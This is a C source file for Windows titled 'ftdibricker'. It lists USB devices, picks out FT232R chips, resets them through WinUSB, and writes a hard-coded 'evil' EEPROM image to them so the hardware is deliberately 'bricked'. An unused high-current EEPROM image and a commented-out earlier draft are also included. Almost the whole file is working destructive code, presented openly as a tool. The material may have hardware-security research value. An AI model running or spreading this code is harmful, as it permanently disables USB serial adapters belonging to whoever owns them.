/*
The MIT License (MIT)

Copyright (c) 2024 David Reguera Garcia aka Dreg & Ivan Redondo aka S0S4

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


 By: @S0S4 & Dreg
 github.com/therealdreg


https://ftdichip.com/wp-content/uploads/2020/08/AN_428-D2XX-EEPROM-Programming-Examples.pdf
http://www.ftdichip.com/Support/SoftwareExamples/CodeExamples/VC++/AN_428_D2XX_EEPROM_Programming_Examples.zip
*/

// by Dreg
// add _CRT_SECURE_NO_WARNINGS;

#include <stdio.h>

#include <shlwapi.h>
#include <windows.h>
#include <winusb.h>
#include <setupapi.h>
#include <usbiodef.h>

unsigned char evil_eepr[] = { // EVIL EEPROM
    0x02, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06, 0xA0, 0x2D, 0x08, 0x00,
    0x00, 0x02, 0x98, 0x0A, 0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,
    0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00, 0x49, 0x00, 0x20, 0x03,
    0x46, 0x00, 0x54, 0x00, 0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,
    0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x20, 0x00, 0x55, 0x00,
    0x41, 0x00, 0x52, 0x00, 0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,
    0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00, 0x41, 0x00, 0x36, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0xD4, 0x54 };  // last two bytes == checksum

unsigned char highcurr_eepr[] = { // HIGH CURRENT I/O EEPROM
    0x04, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06, 0xA0, 0x2D, 0x08, 0x00,
    0x00, 0x02, 0x98, 0x0A, 0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,
    0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00, 0x49, 0x00, 0x20, 0x03,
    0x46, 0x00, 0x54, 0x00, 0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,
    0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x20, 0x00, 0x55, 0x00,
    0x41, 0x00, 0x52, 0x00, 0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,
    0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00, 0x41, 0x00, 0x36, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0xD7, 0x54 }; // last two bytes == checksum


#define GUID_FORMAT "%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX"
#define GUID_ARG(guid) (guid).Data1, (guid).Data2, (guid).Data3, (guid).Data4[0], (guid).Data4[1], (guid).Data4[2], (guid).Data4[3], (guid).Data4[4], (guid).Data4[5], (guid).Data4[6], (guid).Data4[7]

#pragma comment( lib, "winusb.lib")
#pragma comment( lib, "setupapi.lib")
#pragma comment( lib, "shlwapi.lib")

#define PAGSIZ 0x1000

#pragma pack(1)

typedef struct _DREGWINUSB_SETUP_PACKET
{
    UCHAR   RequestType;
    UCHAR   Request;
    union
    {
        USHORT  Value;
        UCHAR   ValueB[2];
    };
    union
    {
        USHORT  Index;
        UCHAR   IndexB[2];
    };
    union
    {
        USHORT  Length;
        UCHAR   LengthB[2];
    };
} DREGWINUSB_SETUP_PACKET, *PDREGWINUSB_SETUP_PACKET;


typedef int size_must_match[sizeof(WINUSB_SETUP_PACKET) == sizeof(DREGWINUSB_SETUP_PACKET)];


/*
#ifndef GUID_DEVINTERFACE_USB_DEVICE
DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);
#endif
*/


int intmain(int argc, char* argv[])
{
    unsigned index = 0;
    HDEVINFO hDevInfo = 0;
    PSP_DEVICE_INTERFACE_DETAIL_DATA_W DeviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)VirtualAlloc(NULL, PAGSIZ, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    puts("ftdibricker for win32 by Dreg, run as Admin!");
    puts("you must replace default FTDI driver with WINUSB using ZADIG software");

    if (NULL == DeviceInterfaceDetailData)
    {
        puts("Failed to allocate memory for device interface detail data.");
        return -1;
    }

    puts("Listing USB:");
    hDevInfo = SetupDiGetClassDevsW(&GUID_DEVINTERFACE_USB_DEVICE, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    for (index = 0;; index++)
    {
        SP_DEVINFO_DATA DeviceInfoData = { 0 };
        WCHAR HardwareID[1024] = { 0 };

        DeviceInfoData.cbSize = sizeof(DeviceInfoData);
        if (!SetupDiEnumDeviceInfo(hDevInfo, index, &DeviceInfoData))
        {
            break;
        }

        if (!SetupDiGetDeviceRegistryPropertyW(hDevInfo, &DeviceInfoData, SPDRP_HARDWAREID, NULL, (BYTE*)HardwareID, sizeof(HardwareID), NULL))
        {
            printf("Failed to get hardware ID for device index %d.\n", index);
            continue;
        }

        wprintf(L"\n-\n%ls\n", HardwareID);
        printf("GUID = {" GUID_FORMAT "}\n", GUID_ARG(DeviceInfoData.ClassGuid));
        if (StrStrIW(HardwareID, L"VID_0403&PID_6001"))
        {
            SP_DEVICE_INTERFACE_DATA interfaceData = { 0 };

            puts("FT232R found bitch...");
            interfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);
            if (SetupDiEnumDeviceInterfaces(hDevInfo, &DeviceInfoData, &GUID_DEVINTERFACE_USB_DEVICE, 0, &interfaceData))
            {
                memset(DeviceInterfaceDetailData, 0, PAGSIZ);
                DeviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
                if (!SetupDiGetDeviceInterfaceDetail(hDevInfo, &interfaceData, DeviceInterfaceDetailData, PAGSIZ, NULL, NULL))
                {
                    puts("Failed to get device interface detail.");
                }
                else
                {
                    HANDLE deviceHandle = INVALID_HANDLE_VALUE;

                    wprintf(L"Device interface detail obtained successfully, openning:\n%ls\n", DeviceInterfaceDetailData->DevicePath);
                    deviceHandle = CreateFileW(DeviceInterfaceDetailData->DevicePath,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                        NULL);
                    if (deviceHandle != INVALID_HANDLE_VALUE)
                    {
                        WINUSB_INTERFACE_HANDLE winUSBHandle = NULL;

                        puts("Device handle obtained successfully.");
                        if (WinUsb_Initialize(deviceHandle, &winUSBHandle))
                        {
                            DREGWINUSB_SETUP_PACKET SetupPacket = { 0 };
                            UCHAR buffer[512] = { 0 };
                            ULONG bytesTransferred = 0;

                            puts("Dreg is bricking your FT232R :D...\n");
                            SetupPacket.RequestType = 0x40;
                            SetupPacket.Request = 0;
                            SetupPacket.Value = 0;
                            SetupPacket.Index = 0;
                            SetupPacket.Length = 0;
                            if (WinUsb_ControlTransfer(winUSBHandle, *((WINUSB_SETUP_PACKET*)(&SetupPacket)), NULL, 0, &bytesTransferred, NULL))
                            {
                                puts("reset sended!!");
                                
                                SetupPacket.RequestType = 0xC0;
                                SetupPacket.Request = 0x05;
                                SetupPacket.Value = 0;
                                SetupPacket.Index = 0;
                                SetupPacket.LengthB[0] = 0x02;
                                SetupPacket.LengthB[1] = 0x00;
                                WinUsb_ControlTransfer(winUSBHandle, *((WINUSB_SETUP_PACKET*)(&SetupPacket)), buffer, 2, &bytesTransferred, NULL);
                                puts("pool modem sended!!");

                                SetupPacket.RequestType = 0x40;
                                SetupPacket.Request = 0x09;
                                SetupPacket.ValueB[0] = 0x77;
                                SetupPacket.ValueB[1] = 0x00;
                                SetupPacket.Index = 0;
                                SetupPacket.Length = 0;
                                WinUsb_ControlTransfer(winUSBHandle, *((WINUSB_SETUP_PACKET*)(&SetupPacket)), NULL, 0, &bytesTransferred, NULL);
                                puts("set latency timer 0x77!!");

                                puts("writing eeprom!!");
                                for (unsigned int i = 0; i < 0x3f + 1; i++)
                                {
                                    SetupPacket.RequestType = 0x40;
                                    SetupPacket.Request = 0x91;
                                    SetupPacket.ValueB[0] = evil_eepr[(2 * i) + 0];
                                    SetupPacket.ValueB[1] = evil_eepr[(2 * i) + 1];
                                    SetupPacket.IndexB[0] = i;
                                    SetupPacket.IndexB[1] = 0;
                                    SetupPacket.Length = 0;
                                    WinUsb_ControlTransfer(winUSBHandle, *((WINUSB_SETUP_PACKET*)(&SetupPacket)), NULL, 0, &bytesTransferred, NULL);
                                    printf("%02X %02X ", evil_eepr[(2 * i) + 0], evil_eepr[(2 * i) + 1]);
                                }
                                puts("\n");
                            }
                            else
                            {
                                puts("error sending reset!");
                                printf("GetLastError: %d 0x%x\n", GetLastError(), GetLastError());
                            }
                        }
                        WinUsb_Free(winUSBHandle);
                        CloseHandle(deviceHandle);
                    }
                    else
                    {
                        printf("Failed to open device: %ld.\n", GetLastError());
                    }
                }
            }
            else
            {
                printf("Failed to enumerate device interfaces: %ld.\n", GetLastError());
            }
        }
    }

    SetupDiDestroyDeviceInfoList(hDevInfo);
    VirtualFree(DeviceInterfaceDetailData, 0, MEM_RELEASE);

    return 0;
}

int main(int argc, char* argv[])
{
    int retf = intmain(argc, argv);

    puts("\nPRESS ENTER TO EXIT");
    getchar();

    return retf;
}


/*
unsigned index = 0;
HDEVINFO hDevInfo = 0;
PSP_DEVICE_INTERFACE_DETAIL_DATA_W DeviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)VirtualAlloc(NULL, PAGSIZ, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

puts("ftdibricker for win32 by Dreg, run as Admin!");

if (NULL == DeviceInterfaceDetailData)
{
return -1;
}

puts("Listing USB:");
hDevInfo = SetupDiGetClassDevsW(NULL, L"USB", NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
for (index = 0;; index++) {
HANDLE deviceHandle = INVALID_HANDLE_VALUE;
WINUSB_INTERFACE_HANDLE winUSBHandle = NULL;
SP_DEVINFO_DATA DeviceInfoData = { 0 };
WCHAR HardwareID[1024] = { 0 };

DeviceInfoData.cbSize = sizeof(DeviceInfoData);
if (!SetupDiEnumDeviceInfo(hDevInfo, index, &DeviceInfoData)) {
break;
}

SetupDiGetDeviceRegistryPropertyW(hDevInfo, &DeviceInfoData, SPDRP_HARDWAREID, NULL, (BYTE*)HardwareID, sizeof(HardwareID), NULL);
wprintf(L"%ls\n", HardwareID);
printf("GUID = {" GUID_FORMAT "}\n", GUID_ARG(DeviceInfoData.ClassGuid));
if (wcsstr(HardwareID, L"VID_0403&PID_6001") || 1) {
{

SP_DEVICE_INTERFACE_DATA interfaceData;
interfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);
if (SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &DeviceInfoData.ClassGuid, 0, &interfaceData)) {
if (!SetupDiGetDeviceInterfaceDetail(hDevInfo, &interfaceData, DeviceInterfaceDetailData, PAGSIZ, NULL, NULL)) {
puts("craap!");
// handle error
}
else {
// Now DeviceInterfaceDetailData->DevicePath contains the path to use with CreateFile
puts("ok!");
}
}
printf("GetLastError: %d 0x%x\n", GetLastError(), GetLastError());
}
SP_DEVICE_INTERFACE_DATA DeviceInterfaceData = { 0 };
memset(DeviceInterfaceDetailData, 0, PAGSIZ);
DeviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

puts("FT232R found bitch...\n");

printf("GetLastError: %d 0x%x\n", GetLastError(), GetLastError());
memset(DeviceInterfaceDetailData, 0, PAGSIZ);
DeviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

printf("GetLastError: %d 0x%x\n", GetLastError(), GetLastError());
if (SetupDiGetDeviceInterfaceDetailW(hDevInfo, &DeviceInterfaceData, DeviceInterfaceDetailData, PAGSIZ, NULL, NULL))
{
wprintf(L"Openning %ls\n", DeviceInterfaceDetailData->DevicePath);
deviceHandle = CreateFileW(DeviceInterfaceDetailData->DevicePath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if (deviceHandle != INVALID_HANDLE_VALUE) {
if (WinUsb_Initialize(deviceHandle, &winUSBHandle)) {
puts("Dreg is bricking your FT232R :D...\n");
WINUSB_SETUP_PACKET SetupPacket = { 0 };
SetupPacket.RequestType = 0;
SetupPacket.Request = 0;
SetupPacket.Value = 0;
SetupPacket.Index = 0;
SetupPacket.Length = 0;

UCHAR buffer[512] = { 0 };
ULONG bytesTransferred = 0;
if (WinUsb_ControlTransfer(winUSBHandle, SetupPacket, buffer, sizeof(buffer), &bytesTransferred, NULL)) {
// Control transfer was successful
}
else {
}
}
WinUsb_Free(winUSBHandle);
}
CloseHandle(deviceHandle);
}
printf("GetLastError: %d 0x%x\n", GetLastError(), GetLastError());
}
}

SetupDiDestroyDeviceInfoList(hDevInfo);

VirtualFree(DeviceInterfaceDetailData, 0, MEM_RELEASE);

return 0;
*/